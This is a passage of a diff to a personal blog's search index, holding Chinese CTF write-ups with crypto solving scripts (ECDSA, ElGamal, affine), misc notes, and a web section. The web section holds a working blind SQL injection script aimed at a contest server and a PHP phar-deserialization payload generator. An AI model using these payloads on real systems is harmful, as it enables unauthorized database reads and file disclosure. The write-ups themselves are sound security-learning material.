+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INF = (<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="number">311315114987715623444276142623839583360207853110657101019745009424926710590583360123029204556690633449715530612380512577293882572730509350735778781050933</span></span><br><span class="line"></span><br><span class="line">mod = <span class="number">8948962207650232551656602815159153422162609644098354511344597187200057010413552439917934304191956942765446530386427345937963894309923928536070534607816947</span></span><br><span class="line">a = <span class="number">6294860557973063227666421306476379324074715770622746227136910445450301914281276098027990968407983962691151853678563877834221834027439718238065725844264138</span></span><br><span class="line">b = <span class="number">3245789008328967059274849584342077916531909009637501918328323668736179176583263496463525128488282611559800773506973771797764811498834995234341530862286627</span></span><br><span class="line">n = <span class="number">8948962207650232551656602815159153422162609644098354511344597187200057010413418528378981730643524959857451398370029280583094215613882043973354392115544169</span></span><br><span class="line">G = (<span class="number">5139617820728399941653175323358137352238277428061991823713659546881441331696699723004749024403291797641521696406798421624364096550661311227399430098134141</span>,</span><br><span class="line">     <span class="number">1798860115416690485862271986832828064808333512613833729548071279524320966991708554765227095605106785724406691559310536469721469398449016850588110200884962</span>,</span><br><span class="line">     <span class="number">5042518522433577951395875294780962682755843408950010956510838422057522452845550974098236475624683438351211176927595173916071040272153903968536756498306512</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Double</span>(<span class="params">p</span>):</span></span><br><span class="line">    x, y, z = p</span><br><span class="line">    <span class="keyword">if</span> z == <span class="number">0</span> <span class="keyword">or</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> INF</span><br><span class="line">    ysqr = y * y % mod</span><br><span class="line">    zsqr = z * z % mod</span><br><span class="line">    s = <span class="number">4</span> * x * ysqr % mod</span><br><span class="line">    m = (<span class="number">3</span> * x * x + a * zsqr * zsqr) % mod</span><br><span class="line">    x2 = (m * m - <span class="number">2</span> * s) % mod</span><br><span class="line">    y2 = (m * (s - x2) - <span class="number">8</span> * ysqr * ysqr) % mod</span><br><span class="line">    z2 = <span class="number">2</span> * y * z % mod</span><br><span class="line">    <span class="keyword">return</span> x2, y2, z2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">p, q</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p[<span class="number">2</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> q</span><br><span class="line">    <span class="keyword">if</span> q[<span class="number">2</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    x1, y1, z1 = p</span><br><span class="line">    x2, y2, z2 = q</span><br><span class="line">    z1sqr = z1 * z1 % mod</span><br><span class="line">    z2sqr = z2 * z2 % mod</span><br><span class="line">    u1 = x1 * z2sqr % mod</span><br><span class="line">    u2 = x2 * z1sqr % mod</span><br><span class="line">    s1 = y1 * z2 * z2sqr % mod</span><br><span class="line">    s2 = y2 * z1 * z1sqr % mod</span><br><span class="line">    <span class="keyword">if</span> u1 == u2:</span><br><span class="line">        <span class="keyword">if</span> s1 != s2:</span><br><span class="line">            <span class="keyword">return</span> INF</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Double(p)</span><br><span class="line">    h = u2 - u1 % mod</span><br><span class="line">    hsqr = h * h % mod</span><br><span class="line">    hcube = hsqr * h % mod</span><br><span class="line">    r = s2 - s1 % mod</span><br><span class="line">    t = u1 * hsqr % mod</span><br><span class="line">    x3 = (r * r - hcube - <span class="number">2</span> * t) % mod</span><br><span class="line">    y3 = (r * (t - x3) - s1 * hcube) % mod</span><br><span class="line">    z3 = h * z1 * z2 % mod</span><br><span class="line">    <span class="keyword">return</span> x3, y3, z3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Multiply</span>(<span class="params">p, x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p == INF:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    res = INF</span><br><span class="line">    <span class="keyword">while</span> x:</span><br><span class="line">        x, r = <span class="built_in">divmod</span>(x, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> r:</span><br><span class="line">            res = Add(res, p)</span><br><span class="line">        p = Double(p)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Transform</span>(<span class="params">m, l</span>):</span></span><br><span class="line">    z = m</span><br><span class="line">    shift = l - n.bit_length()</span><br><span class="line">    <span class="keyword">if</span> shift &gt; <span class="number">0</span>:</span><br><span class="line">        z &gt;&gt;= shift</span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RNG</span>(<span class="params">nbits, a, b</span>):</span></span><br><span class="line">    nbytes = nbits // <span class="number">8</span></span><br><span class="line">    B = os.urandom(nbytes)</span><br><span class="line">    <span class="keyword">return</span> a * <span class="built_in">sum</span>([B[i] * b ** i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(B))]) % <span class="number">2</span>**nbits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sign</span>(<span class="params">msg, d</span>):</span></span><br><span class="line">    h = hashlib.sha512(msg)</span><br><span class="line">    z = Transform(<span class="built_in">int</span>.from_bytes(h.digest(), <span class="string">&#x27;big&#x27;</span>), h.digest_size*<span class="number">8</span>)</span><br><span class="line">    print(<span class="string">&#x27;d = &#x27;</span>, d)</span><br><span class="line">    print(<span class="string">&#x27;z = &#x27;</span>, z)</span><br><span class="line">    k = RNG(n.bit_length(), <span class="number">16843009</span>, <span class="number">4294967296</span>)</span><br><span class="line">    print(<span class="string">&#x27;k = &#x27;</span>, k)</span><br><span class="line">    x1, y1, z1 = Multiply(G, k)</span><br><span class="line">    r = (x1 * <span class="built_in">pow</span>(z1, -<span class="number">2</span>, mod) % mod) % n</span><br><span class="line">    s = <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * d) % n</span><br><span class="line">    print(<span class="string">&#x27;r = &#x27;</span>, r)</span><br><span class="line">    print(<span class="string">&#x27;s = &#x27;</span>, s)</span><br><span class="line">    print(<span class="string">&#x27;left = &#x27;</span>, <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) % n)</span><br><span class="line">    print(<span class="string">&#x27;right = &#x27;</span>, (z + r * d) % n)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">int</span>(s) == <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * d) % n</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Verify</span>(<span class="params">msg, Q, r, s</span>):</span></span><br><span class="line">    h = hashlib.sha512(msg)</span><br><span class="line">    z = Transform(<span class="built_in">int</span>.from_bytes(h.digest(), <span class="string">&#x27;big&#x27;</span>), h.digest_size*<span class="number">8</span>)</span><br><span class="line">    u1 = z*<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) % n</span><br><span class="line">    u2 = r*<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) % n</span><br><span class="line">    x1, y1, z1 = Add(Multiply(G, u1), Multiply(Q, u2))</span><br><span class="line">    <span class="keyword">return</span> r == (x1 * <span class="built_in">pow</span>(z1, -<span class="number">2</span>, mod) % mod) % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">plaintext, x</span>):</span></span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(x).encode()).digest()</span><br><span class="line">    aes = algorithms.AES(key)</span><br><span class="line">    encryptor = Cipher(aes, modes.ECB(), default_backend()).encryptor()</span><br><span class="line">    padder = padding.PKCS7(aes.block_size).padder()</span><br><span class="line">    padded_data = padder.update(plaintext) + padder.finalize()</span><br><span class="line">    ciphertext = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">ciphertext, x</span>):</span></span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(x).encode()).digest()</span><br><span class="line">    aes = algorithms.AES(key)</span><br><span class="line">    decryptor = Cipher(aes, modes.ECB(), default_backend()).decryptor()</span><br><span class="line">    unpadder = padding.PKCS7(aes.block_size).unpadder()</span><br><span class="line">    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()</span><br><span class="line">    plaintext = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line">_, _, ca = (<span class="number">8832295267397231051293216564016639537146222596144354850230682204978731311879255662259663270183445827348338041752369314181111940713714991119349376636404112</span>, <span class="number">8683784208731634307361157916911868656279723101808163939313971801256736484458199874570532609285522391139002296248059424750941962344918156540408403221858292</span>, <span class="number">105398535464409171419472607677747462033030589690350997911381059472020486557672504778060748058626707326992258591478040500759349352824508941100030623708235493999018571171774658661651532338275358740821547158517615704187173346885098836066743736788259192831313414309775979590033581301910426314601982482556670097620</span>)</span><br><span class="line"></span><br><span class="line">ka = [</span><br><span class="line">    <span class="number">0x8a6e81a10c229af504772b51c502638820811034faa62b8dafa019210347918419b71d0638c89b59026b7611edc6a14b2c1c1fb1092a352adfffb7e114f4f385</span>,</span><br><span class="line">    <span class="number">0x3f837315a1fb46097f5eb680697901d75758b859846d37cad33d3f464efb84ace1e85fc60f4e445a031b5ca0e4965e0b081bd4a6e8efea1d3ba07aad51a70cd</span></span><br><span class="line">]</span><br><span class="line">ca = ca.to_bytes(byteorder=<span class="string">&#x27;big&#x27;</span>,length=(ca.bit_length() + <span class="number">7</span>) // <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> ka:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        recv_msg = Decrypt(ca, k)</span><br><span class="line">        print(recv_msg)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a>ElGamal</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;./output.txt&#x27;</span>).read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">g, h, A, B, p, q = <span class="built_in">eval</span>(data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">c1, c2 = <span class="built_in">eval</span>(data[<span class="number">1</span>])</span><br><span class="line">c1_, c2_ = <span class="built_in">eval</span>(data[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">tmp = gmpy2.powmod(c2, A, p) * gmpy2.powmod(h, B, p) * gmpy2.invert(c2_, p)</span><br><span class="line">tmp = tmp % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;t=&#x27;</span>, tmp</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;A=&#x27;</span>, A</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;p=&#x27;</span>, p</span><br><span class="line">gg, x, y = gmpy2.gcdext(A - <span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span> gg</span><br><span class="line"></span><br><span class="line">m = gmpy2.powmod(tmp, x, p)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(m)[<span class="number">2</span>:].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到-2"><a href="#签到-2" class="headerlink" title="签到"></a>签到</h3><p>base32解码</p>
+<h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>zsteg直接出</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/QQ%E5%9B%BE%E7%89%8720211007231453.png"></p>
+<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>百度识图，福尔摩斯，搜索发现跳舞的小人</p>
+<p>发现提示信息<a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
+<p>密码文件虽然空白但是占用空间很大，用上面的工具</p>
+<p>最后16进制转字符串得到flag</p>
+<h3 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h3><p>扫描机票上的条形码即可，属于pdf417，m1后面就是姓名</p>
+<p><a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a></p>
+]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
     <title>2021Roke</title>
     <url>/posts/46047524/</url>
     <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>20211031</title>
-    <url>/posts/161306f5/</url>
-    <content><![CDATA[<p>失眠了，想了想不知道干什么</p>
-<p>刚开始玩了会古墓丽影，不想玩了</p>
-<p>想到前段时间服务器好像坏了，又修了修，重新在服务器上把博客搭好了</p>
-<p>现在博客Github上和服务器上的都能用</p>
-<p>之所以保留Github是因为足够稳定，用的是一级域名，<a href="https://haorical.xyz/">https://haorical.xyz</a></p>
-<p>服务器用的阿里云，国内比较快，用的二级域名，<a href="http://blog.haorical.xyz/">http://blog.haorical.xyz</a></p>
-<p>暂时没部署证书，以后再弄吧，现在不想弄了。</p>
-<p>又不知道干啥了，过两天生日，一点感觉都没有，明天还得复习线代还得打比赛。。。</p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
   </entry>
   <entry>
     <title>58.245.43.163</title>
@@ -1169,67 +1252,6 @@ while os.path.exists(p1) or os.path.exists(p2):
       </tags>
   </entry>
   <entry>
-    <title>2021秋季赛部分wp</title>
-    <url>/posts/31200392/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>震惊！平平无奇的web手，竟然把crypto ak了，顺带做了2个re和几个misc。。。</p>
-<p>校赛感觉难度一般，就是给入门的做了，暑假学的好多都用上了，感觉不错。不过持续时间太长了，直接7天，而且国庆那几天贼忙，部门、工作室、新生······时间不是很合理，最后几天直接摆烂了，一个题也没做。</p>
-<span id="more"></span>
-
-<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><blockquote>
-<p>无列名注入，和寒假赛的类似</p>
-</blockquote>
-<p>库名还是cumtctf</p>
-<p>爆表名得到flag_table_1</p>
-<p>无列名注入得到flag，需要变成小写</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://81.69.241.44:25500/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">s = <span class="string">&quot;-&#123;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,_!@#$%^&amp;*()&#125;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">for i in range(1,1000):</span></span><br><span class="line"><span class="string">    for j in s:</span></span><br><span class="line"><span class="string">        time.sleep(0.1)</span></span><br><span class="line"><span class="string">        payload = &quot;1&#x27;/**/||/**/!(ascii(mid((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/!(database_name&lt;&gt;&#x27;cumtctf&#x27;)),&#123;&#125;,1))&lt;&gt;ascii(&#x27;&#123;&#125;&#x27;))#&quot;.format(i, j)</span></span><br><span class="line"><span class="string">        data = &#123;</span></span><br><span class="line"><span class="string">            &#x27;username&#x27;: payload,</span></span><br><span class="line"><span class="string">            &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">        if res.find(&#x27;good&#x27;) != -1:</span></span><br><span class="line"><span class="string">            table += j</span></span><br><span class="line"><span class="string">            print(table)</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload2 = &quot;1&#x27;/**/||/**/!(mid((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/!(database_name&lt;&gt;&#x27;cumtctf&#x27;)),1,34)&lt;&gt;&#x27;address,email,flag_table_1,users&#x27;)#;&quot;</span></span><br><span class="line"><span class="string">data = &#123;</span></span><br><span class="line"><span class="string">    &#x27;username&#x27;: payload2,</span></span><br><span class="line"><span class="string">    &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload3 = &quot;1&#x27;/**/||/**/(1,1)&gt;(select/**/*/**/from/**/flag_table_1/**/limit/**/0,1)#;&quot;</span></span><br><span class="line"><span class="string">data = &#123;</span></span><br><span class="line"><span class="string">    &#x27;username&#x27;: payload3,</span></span><br><span class="line"><span class="string">    &#x27;password&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">res = requests.post(url=url, headers=headers, data=data).text</span></span><br><span class="line"><span class="string">print(res)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span>(<span class="params">flag</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>): </span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br><span class="line">    hexchar = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">    <span class="comment"># for j in s:</span></span><br><span class="line">        hexchar = trans(flag+ <span class="built_in">chr</span>(char))</span><br><span class="line">        payload = <span class="string">&quot;0&#x27;||/**/if((select/**/(0,&#123;&#125;)&gt;(select/**/*/**/from/**/flag_table_1/**/limit/**/0,1)),1,0)#&quot;</span>.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> r.find(<span class="string">&#x27;good&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># flag += j</span></span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><blockquote>
-<p>phar反序列化</p>
-</blockquote>
-<p>先通过任意文件读取获得class file fun class这些php文件，代码审计</p>
-<p>构造pop链，生成phar文件</p>
-<p>看到已经有其他队伍把这题做出来了，此时先测试看看能不能连上别的队伍上传成功的文件，根据file.php中对文件名的处理，随便测试了几个，发现phar.jpg处理后的文件路径能用，获得flag</p>
-<p>下面贴上自己写的</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fakefile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Docker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$container2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cloud</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;value = <span class="string">&quot;/var/www/html/flag.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$File</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$docker</span> = <span class="keyword">new</span> Docker();</span><br><span class="line"><span class="variable">$cloud</span> = <span class="keyword">new</span> Cloud();</span><br><span class="line"></span><br><span class="line"><span class="variable">$cloud</span>-&gt;docker = <span class="string">&#x27;O\:6\:\&quot;Docker\&quot;\:3\:\&#123;s\:3\:\&quot;str\&quot;\;s\:4\:\&quot;haha\&quot;\;s\:10\:\&quot;container1\&quot;\;s\:4\:\&quot;haha\&quot;\;s\:10\:\&quot;container2\&quot;\;s\:4\:\&quot;haha\&quot;\;\&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$File</span>-&gt;file = <span class="variable">$docker</span>;</span><br><span class="line"><span class="variable">$docker</span>-&gt;str = <span class="variable">$cloud</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$File</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>直接拖到ida里，得到flag</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/QQ%E6%88%AA%E5%9B%BE20211003125756.png"></p>
-<h3 id="net"><a href="#net" class="headerlink" title="net"></a>net</h3><p>拖到ILSpy里，获得逆向代码</p>
-<p>简单写个脚本</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ppp</span>(<span class="params">a, b, c</span>):</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    a %= c</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> b % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            num = num * a % c</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span></span><br><span class="line">        a = a * a % c      </span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">array2 = [</span><br><span class="line">            <span class="number">30361</span>,</span><br><span class="line">			<span class="number">550</span>,</span><br><span class="line">			<span class="number">595</span>,</span><br><span class="line">			<span class="number">15412</span>,</span><br><span class="line">			<span class="number">30361</span>,</span><br><span class="line">			<span class="number">15412</span>,</span><br><span class="line">			<span class="number">8346</span>,</span><br><span class="line">			<span class="number">27071</span>,</span><br><span class="line">			<span class="number">37594</span>,</span><br><span class="line">			<span class="number">37534</span>,</span><br><span class="line">			<span class="number">9781</span>,</span><br><span class="line">			<span class="number">1082</span>,</span><br><span class="line">			<span class="number">19619</span>,</span><br><span class="line">			<span class="number">9781</span>,</span><br><span class="line">			<span class="number">1082</span>,</span><br><span class="line">			<span class="number">15513</span>,</span><br><span class="line">			<span class="number">29591</span>,</span><br><span class="line">			<span class="number">19596</span>,</span><br><span class="line">			<span class="number">30078</span>,</span><br><span class="line">			<span class="number">27942</span>,</span><br><span class="line">			<span class="number">25366</span>,</span><br><span class="line">			<span class="number">29107</span>,</span><br><span class="line">			<span class="number">7433</span>,</span><br><span class="line">			<span class="number">28493</span>,</span><br><span class="line">			<span class="number">9781</span>,</span><br><span class="line">			<span class="number">29591</span>,</span><br><span class="line">			<span class="number">2664</span>,</span><br><span class="line">			<span class="number">12540</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">test = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array2)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100000</span>):</span><br><span class="line">        <span class="keyword">if</span> array2[j] == ppp(i, <span class="number">377</span>, <span class="number">38009</span>):</span><br><span class="line">            test.append(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> test:</span><br><span class="line">        print(<span class="built_in">chr</span>(j-i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>跑出flag</p>
-<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a>签到</h3><p>简单写个脚本爆破</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">a = <span class="number">37</span></span><br><span class="line">b = <span class="number">23</span></span><br><span class="line">c = <span class="number">52</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def affine(m,a,b,c):</span></span><br><span class="line"><span class="string">    chipher=&#x27;&#x27;</span></span><br><span class="line"><span class="string">    for i in range(len(m)):</span></span><br><span class="line"><span class="string">        if m[i] in table:</span></span><br><span class="line"><span class="string">            chipher+=table[(a*(table.find(m[i]))+b)%c]</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            chipher+=m[i]</span></span><br><span class="line"><span class="string">    return chipher</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;aoxL&#123;Fw0_TXk_y3xtW_ZP_TCBg7VLCxGwb&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">    <span class="keyword">if</span> t[i] <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">if</span> table[(a*(table.find(j))+b)%c] == t[i]:</span><br><span class="line">                flag += j</span><br><span class="line">                print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += t[i]</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span 